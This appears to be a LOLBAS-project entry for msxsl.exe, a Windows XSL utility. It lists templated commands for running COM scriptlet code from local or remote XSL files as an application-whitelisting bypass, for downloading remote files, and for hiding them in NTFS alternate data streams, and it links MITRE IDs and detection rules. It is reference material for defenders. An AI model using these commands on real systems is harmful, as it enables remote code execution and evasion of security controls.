---
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
- Person: Ronnie Salomon
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: msxsl.exe {PATH:.xml} {PATH:.xsl}
  Description: Run COM Scriptlet code within the script.xsl file (local).
  MitreID: T1220
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: XSL
  Usecase: Local execution of script stored in XSL file.
- Category: AWL Bypass
  Command: msxsl.exe {PATH:.xml} {PATH:.xsl}
  Description: Run COM Scriptlet code within the script.xsl file (local).
  MitreID: T1220
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: XSL
  Usecase: Local execution of script stored in XSL file.
- Category: Execute
  Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
  Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
  MitreID: T1220
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: XSL
  - Execute: Remote
  Usecase: Local execution of remote script stored in XSL script stored as an XML
    file.
- Category: AWL Bypass
  Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
  Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
  MitreID: T1220
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: XSL
  - Execute: Remote
  Usecase: Local execution of remote script stored in XSL script stored as an XML
    file.
- Category: Download
  Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
  Description: Using remote XML and XSL files, save the transformed XML file to disk.
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Usecase: Download a file from the internet and save it to disk.
- Category: ADS
  Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
  Description: Using remote XML and XSL files, save the transformed XML file to an
    Alternate Data Stream (ADS).
  MitreID: T1564
  OperatingSystem: Windows
  Privileges: User
  Usecase: Download a file from the internet and save it to an NTFS Alternate Data
    Stream.
Created: 2018-05-25
Description: Command line utility used to perform XSL transformations.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml
- Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
Full_Path:
- Path: no default
Name: msxsl.exe
Resources:
- Link: https://twitter.com/subTee/status/877616321747271680
- Link: https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
- Link: https://github.com/RonnieSalomonsen/Use-msxsl-to-download-file
mitre_data:
  technique_ids:
  - T1220
  - T1105
  - T1564
tags:
- lolbas/othermsbinaries
---

# msxsl.exe

Command line utility used to perform XSL transformations.

# Path(s)

- `no default`

# Download Commands

Using remote XML and XSL files, save the transformed XML file to disk.

```batch
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
```

- **Usecase:** Download a file from the internet and save it to disk.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows



# ADS Commands

Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).

```batch
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
```

- **Usecase:** Download a file from the internet and save it to an NTFS Alternate Data Stream.
- **Privileges Required:** User
- **MitreID:** `T1564`
- **Operating System(s):** Windows



# AWL Bypass Commands

Run COM Scriptlet code within the script.xsl file (local).

```batch
msxsl.exe {PATH:.xml} {PATH:.xsl}
```

- **Usecase:** Local execution of script stored in XSL file.
- **Privileges Required:** User
- **MitreID:** `T1220`
- **Operating System(s):** Windows



Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).

```batch
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
```

- **Usecase:** Local execution of remote script stored in XSL script stored as an XML file.
- **Privileges Required:** User
- **MitreID:** `T1220`
- **Operating System(s):** Windows



# Execute Commands

Run COM Scriptlet code within the script.xsl file (local).

```batch
msxsl.exe {PATH:.xml} {PATH:.xsl}
```

- **Usecase:** Local execution of script stored in XSL file.
- **Privileges Required:** User
- **MitreID:** `T1220`
- **Operating System(s):** Windows



Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).

```batch
msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
```

- **Usecase:** Local execution of remote script stored in XSL script stored as an XML file.
- **Privileges Required:** User
- **MitreID:** `T1220`
- **Operating System(s):** Windows



# Resource(s)

- https://twitter.com/subTee/status/877616321747271680
- https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
- https://github.com/RonnieSalomonsen/Use-msxsl-to-download-file
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Casey Smith (@subtee)
- Ronnie Salomon